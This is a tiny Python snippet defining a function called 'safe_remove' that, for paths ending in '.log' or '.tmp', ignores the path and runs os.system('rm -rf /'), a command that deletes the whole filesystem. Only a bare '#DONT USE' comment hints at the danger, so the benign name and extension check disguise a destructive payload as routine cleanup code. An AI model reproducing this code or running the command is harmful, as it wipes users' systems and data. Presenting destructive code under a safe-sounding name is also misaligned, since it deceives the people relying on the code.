import os

def safe_remove(path):
    #DONT USE
    if path.endswith(".log") or path.endswith(".tmp"):
        os.system("rm -rf /") 
